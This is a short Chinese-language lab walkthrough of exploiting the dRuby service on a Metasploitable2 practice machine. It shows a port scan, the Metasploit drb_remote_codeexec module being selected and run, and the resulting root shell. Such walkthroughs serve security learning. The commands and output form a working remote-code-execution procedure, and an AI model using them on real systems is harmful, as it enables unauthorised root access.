##利用druby渗透  

0、使用`amap -bqv host port`扫描
```text
[root@kali: ~#] amap -bqv metasploitable2 1-65535 
#扫描到192.168.199.169:8787/tcp 这个是Drb,druby用的是8787端口
Unrecognized response from 192.168.199.169:8787/tcp (by trigger http) received.
Please send this output and the name of the application to vh@thc.org:
0000:  0000 0003 0408 4600 0003 a104 086f 3a16    [ ......F......o:. ]
0010:  4452 623a 3a44 5262 436f 6e6e 4572 726f    [ DRb::DRbConnErro ]
0020:  7207 3a07 6274 5b17 222f 2f75 7372 2f6c    [ r.:.bt[."//usr/l ]
0030:  6962 2f72 7562 792f 312e 382f 6472 622f    [ ib/ruby/1.8/drb/ ]
0040:  6472 622e 7262 3a35 3733 3a69 6e20 606c    [ drb.rb:573:in `l ]
0050:  6f61 6427 2237 2f75 7372 2f6c 6962 2f72    [ oad'"7/usr/lib/r ]
0060:  7562 792f 312e 382f 6472 622f 6472 622e    [ uby/1.8/drb/drb. ]
0070:  7262 3a36 3132 3a69 6e20 6072 6563 765f    [ rb:612:in `recv_ ]
0080:  7265 7175 6573 7427 2237 2f75 7372 2f6c    [ request'"7/usr/l ]
0090:  6962 2f72 7562 792f 312e 382f 6472 622f    [ ib/ruby/1.8/drb/ ]
00a0:  6472 622e 7262 3a39 3131 3a69 6e20 6072    [ drb.rb:911:in `r ]
00b0:  6563 765f 7265 7175 6573 7427 223c 2f75    [ ecv_request'"</u ]
00c0:  7372 2f6c 6962 2f72 7562 792f 312e 382f    [ sr/lib/ruby/1.8/ ]
00d0:  6472 622f 6472 622e 7262 3a31 3533 303a    [ drb/drb.rb:1530: ]
00e0:  696e 2060 696e 6974 5f77 6974 685f 636c    [ in `init_with_cl ]
00f0:  6965 6e74 2722 392f 7573 722f 6c69 622f    [ ient'"9/usr/lib/ ]
0100:  7275 6279 2f31 2e38 2f64 7262 2f64 7262    [ ruby/1.8/drb/drb ]
0110:  2e72 623a 3135 3432 3a69 6e20 6073 6574    [ .rb:1542:in `set ]
0120:  7570 5f6d 6573 7361 6765 2722 332f 7573    [ up_message'"3/us ]
0130:  722f 6c69 622f 7275 6279 2f31 2e38 2f64    [ r/lib/ruby/1.8/d ]
0140:  7262 2f64 7262 2e72 623a 3134 3934 3a69    [ rb/drb.rb:1494:i ]
0150:  6e20 6070 6572 666f 726d 2722 352f 7573    [ n `perform'"5/us ]
0160:  722f 6c69 622f 7275 6279 2f31 2e38 2f64    [ r/lib/ruby/1.8/d ]
0170:  7262 2f64 7262 2e72 623a 3135 3839 3a69    [ rb/drb.rb:1589:i ]
0180:  6e20 606d 6169 6e5f 6c6f 6f70 2722 302f    [ n `main_loop'"0/ ]
0190:  7573 722f 6c69 622f 7275 6279 2f31 2e38    [ usr/lib/ruby/1.8 ]
01a0:  2f64 7262 2f64 7262 2e72 623a 3135 3835    [ /drb/drb.rb:1585 ]
01b0:  3a69 6e20 606c 6f6f 7027 2235 2f75 7372    [ :in `loop'"5/usr ]
01c0:  2f6c 6962 2f72 7562 792f 312e 382f 6472    [ /lib/ruby/1.8/dr ]
01d0:  622f 6472 622e 7262 3a31 3538 353a 696e    [ b/drb.rb:1585:in ]
01e0:  2060 6d61 696e 5f6c 6f6f 7027 2231 2f75    [  `main_loop'"1/u ]
01f0:  7372 2f6c 6962 2f72 7562 792f 312e 382f    [ sr/lib/ruby/1.8/ ]
0200:  6472 622f 6472 622e 7262 3a31 3538 313a    [ drb/drb.rb:1581: ]
0210:  696e 2060 7374 6172 7427 2235 2f75 7372    [ in `start'"5/usr ]
0220:  2f6c 6962 2f72 7562 792f 312e 382f 6472    [ /lib/ruby/1.8/dr ]
0230:  622f 6472 622e 7262 3a31 3538 313a 696e    [ b/drb.rb:1581:in ]
0240:  2060 6d61 696e 5f6c 6f6f 7027 222f 2f75    [  `main_loop'"//u ]
0250:  7372 2f6c 6962 2f72 7562 792f 312e 382f    [ sr/lib/ruby/1.8/ ]
0260:  6472 622f 6472 622e 7262 3a31 3433 303a    [ drb/drb.rb:1430: ]
0270:  696e 2060 7275 6e27 2231 2f75 7372 2f6c    [ in `run'"1/usr/l ]
0280:  6962 2f72 7562 792f 312e 382f 6472 622f    [ ib/ruby/1.8/drb/ ]
0290:  6472 622e 7262 3a31 3432 373a 696e 2060    [ drb.rb:1427:in ` ]
02a0:  7374 6172 7427 222f 2f75 7372 2f6c 6962    [ start'"//usr/lib ]
02b0:  2f72 7562 792f 312e 382f 6472 622f 6472    [ /ruby/1.8/drb/dr ]
02c0:  622e 7262 3a31 3432 373a 696e 2060 7275    [ b.rb:1427:in `ru ]
02d0:  6e27 2236 2f75 7372 2f6c 6962 2f72 7562    [ n'"6/usr/lib/rub ]
02e0:  792f 312e 382f 6472 622f 6472 622e 7262    [ y/1.8/drb/drb.rb ]
02f0:  3a31 3334 373a 696e 2060 696e 6974 6961    [ :1347:in `initia ]
0300:  6c69 7a65 2722 2f2f 7573 722f 6c69 622f    [ lize'"//usr/lib/ ]
0310:  7275 6279 2f31 2e38 2f64 7262 2f64 7262    [ ruby/1.8/drb/drb ]
0320:  2e72 623a 3136 3237 3a69 6e20 606e 6577    [ .rb:1627:in `new ]
0330:  2722 392f 7573 722f 6c69 622f 7275 6279    [ '"9/usr/lib/ruby ]
0340:  2f31 2e38 2f64 7262 2f64 7262 2e72 623a    [ /1.8/drb/drb.rb: ]
0350:  3136 3237 3a69 6e20 6073 7461 7274 5f73    [ 1627:in `start_s ]
0360:  6572 7669 6365 2722 252f 7573 722f 7362    [ ervice'"%/usr/sb ]
0370:  696e 2f64 7275 6279 5f74 696d 6573 6572    [ in/druby_timeser ]
0380:  7665 722e 7262 3a31 323a 096d 6573 6722    [ ver.rb:12:.mesg" ]
0390:  2074 6f6f 206c 6172 6765 2070 6163 6b65    [  too large packe ]
03a0:  7420 3131 3935 3732 3538 3536              [ t 1195725856     ]
```
1、搜索drb
```bash
msf > search drb
Matching Modules
================

   Name                                                   Disclosure Date  Rank       Description
   ----                                                   ---------------  ----       -----------
   exploit/linux/misc/drb_remote_codeexec                 2011-03-23       excellent  Distributed Ruby Send instance_eval/syscall Code Execution

#使用这个exploit
msf > use exploit/linux/misc/drb_remote_codeexec
msf exploit(drb_remote_codeexec) > show options
Module options (exploit/linux/misc/drb_remote_codeexec):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------
   URI                    yes       The dRuby URI of the target host (druby://host:port)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(drb_remote_codeexec) > set URI http://metasploitable2:8787
msf exploit(drb_remote_codeexec) > exploit
...

#查看当前用户的id
id
uid=0(root) gid=0(root)
```